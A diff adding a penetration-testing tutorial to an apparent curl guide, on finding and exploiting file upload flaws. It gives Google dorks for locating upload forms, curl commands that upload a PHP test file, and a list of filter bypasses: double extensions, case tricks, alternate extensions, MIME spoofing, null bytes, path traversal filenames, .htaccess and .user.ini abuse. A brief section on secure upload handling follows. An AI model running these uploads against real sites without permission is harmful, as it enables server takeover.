@@ -818,6 +818,187 @@ Set a maximum redirect limit to avoid infinite loops.
 curl -L --max-redirs 5 https://target.com
 ```
 
+# File Upload Vulnerability. How To Find And Exploit With CURL.
+
+File upload is the most dangerous feature on any website. A single upload form that accepts the wrong file can give an attacker complete control of the server. This guide covers everything. How upload works. How to test it. How to bypass filters. And how to exploit what you find.
+
+---
+
+## How File Upload Works
+
+Every upload form has three parts. The HTML form that lets you pick a file. The browser that sends the file to the server. And the server code that receives the file and saves it somewhere.
+
+The server decides what to accept. Some servers check the file extension. Some check the MIME type. Some check the actual file content. Some check nothing at all. Your job is to find out what the server checks and what it does not.
+
+---
+
+## Where To Find Upload Forms
+
+Upload forms are everywhere. Profile picture uploads. Document submission pages. Contact forms with attachment options. Admin panels with file managers. E-commerce product image uploads. Forum avatar uploads. Anywhere a user can send a file.
+
+Google dorks help you find them faster.
+
+```
+inurl:upload.php
+inurl:file_upload
+intext:"choose file"
+intitle:"upload"
+```
+
+---
+
+## The First Test. Always Start Here.
+
+Create a simple PHP file. Upload it without any tricks. See what the server says.
+
+```bash
+echo '<?php echo "UPLOAD_OK"; ?>' > test.php
+curl -F "file=@test.php" https://target.com/upload.php
+```
+
+If the upload succeeds and the server returns a path to your file, access it directly. If you see `UPLOAD_OK` on the page, the PHP code executed. You have remote code execution. The test is over.
+
+```bash
+curl https://target.com/uploads/test.php
+```
+
+---
+
+## Bypass Techniques. When The Server Says No.
+
+Most servers block `.php` files. But they do not block everything. Here is what you try when the first test fails.
+
+### Double Extension
+
+Some servers only check the last extension. Give them a safe extension to look at while keeping the dangerous one hidden.
+
+```bash
+curl -F "file=@test.php;filename=shell.php.jpg" https://target.com/upload.php
+curl -F "file=@test.php;filename=shell.jpg.php" https://target.com/upload.php
+```
+
+### Case Bypass
+
+Windows servers do not care about uppercase and lowercase. PHP, PhP, pHp — they all execute the same way. But the filter might only check lowercase.
+
+```bash
+curl -F "file=@test.php;filename=shell.PhP" https://target.com/upload.php
+curl -F "file=@test.php;filename=shell.PHP" https://target.com/upload.php
+curl -F "file=@test.php;filename=shell.pHp" https://target.com/upload.php
+```
+
+### Alternate PHP Extensions
+
+PHP files do not have to end in `.php`. Many servers are configured to execute other extensions as PHP. Try them all.
+
+```bash
+curl -F "file=@test.php;filename=shell.phtml" https://target.com/upload.php
+curl -F "file=@test.php;filename=shell.php5" https://target.com/upload.php
+curl -F "file=@test.php;filename=shell.php7" https://target.com/upload.php
+curl -F "file=@test.php;filename=shell.phar" https://target.com/upload.php
+curl -F "file=@test.php;filename=shell.shtml" https://target.com/upload.php
+```
+
+### MIME Type Spoofing
+
+The browser tells the server what type of file is being uploaded. You can lie about this. The server might believe you.
+
+```bash
+curl -F "file=@test.php;type=image/jpeg" https://target.com/upload.php
+curl -F "file=@test.php;type=image/png" https://target.com/upload.php
+curl -F "file=@test.php;type=image/gif" https://target.com/upload.php
+curl -F "file=@test.php;type=application/pdf" https://target.com/upload.php
+```
+
+### Filename Manipulation
+
+You can change the filename that the server sees without changing the actual file. The `filename` parameter in the `-F` flag controls what the server thinks the file is called.
+
+```bash
+curl -F "file=@test.php;filename=innocent.jpg" https://target.com/upload.php
+```
+
+### Null Byte Injection
+
+On older PHP versions, a null byte tricks the server into thinking the filename ends early. Everything after the null byte is ignored.
+
+```bash
+curl -F "file=@test.php;filename=shell.php%00.jpg" https://target.com/upload.php
+```
+
+### Special Characters
+
+Spaces, dots, and path traversal characters can confuse poorly written upload handlers.
+
+```bash
+curl -F "file=@test.php;filename=shell.php." https://target.com/upload.php
+curl -F "file=@test.php;filename=shell.php%20" https://target.com/upload.php
+curl -F "file=@test.php;filename=../shell.php" https://target.com/upload.php
+```
+
+---
+
+## How To Know If The Upload Worked
+
+The server response tells you everything. Look for these signs.
+
+A direct URL to your file in the response body means the file is accessible. A success message like `"uploaded":true` confirms the server accepted it. The original filename appearing in the response means the server kept your name. An error message tells you exactly what filter blocked you — use that information for your next attempt.
+
+If the response gives you nothing, try accessing common upload directories.
+
+```bash
+curl https://target.com/uploads/test.php
+curl https://target.com/upload/test.php
+curl https://target.com/files/test.php
+curl https://target.com/images/test.php
+curl https://target.com/assets/test.php
+curl https://target.com/media/test.php
+curl https://target.com/tmp/test.php
+```
+
+---
+
+## What Stops This Vulnerability
+
+Server side validation is the only real protection. Never trust anything the browser sends. The MIME type can be spoofed. The filename can be manipulated. The extension can be changed.
+
+A secure upload handler does all of these things. It generates a random filename instead of using the one provided by the user. It stores files outside the web root so they cannot be accessed directly. It checks the actual file content using a library like `finfo` rather than trusting the MIME type. It uses a whitelist of allowed extensions rather than a blacklist of blocked ones. It limits the file size. It scans uploaded files for malware.
+
+If any of these protections is missing, the upload form might be vulnerable.
+
+---
+
+## Common Questions
+
+**Q. The upload returned a path but I get 404 when accessing the file. What now?**
+
+The file might be stored outside the web root and served through a script. The filename in the response might be different from the original. The file might have been renamed with a random string. Check the response carefully for any identifier you can use.
+
+**Q. The server renames my file. Is the vulnerability closed?**
+
+Not necessarily. If the server renames the file but keeps the dangerous extension, you can still execute it if you can find the new name. Some servers return the new filename in the upload response. Others place it in a predictable pattern you can guess.
+
+**Q. What if the server blocks all executable extensions?**
+
+Try configuration files. `.htaccess` files can make Apache treat `.jpg` files as PHP. `.user.ini` files can do the same for PHP-FPM. These attacks only work if the server runs Apache or PHP-FPM.
+
+**Q. I found an upload form but it requires authentication. Is it still useful?**
+
+Yes. If you have valid credentials, test the upload form after logging in. Authenticated users often have fewer restrictions on what they can upload. Admin panels are especially dangerous because they often allow any file type.
+
+**Q. How do I test an upload form that expects JSON instead of multipart form data?**
+
+Some modern applications send files as base64 encoded strings inside JSON bodies. This requires a different approach with `-d` instead of `-F`.
+
+```bash
+curl -X POST https://api.target.com/upload \
+  -H "Content-Type: application/json" \
+  -d '{"filename":"test.php","content":"PD9waHAgZWNobyAiVVBMT0FEX09LIjsgPz4="}'
+```
+
+The base64 string decodes to your PHP payload.
+
+
 
 
 
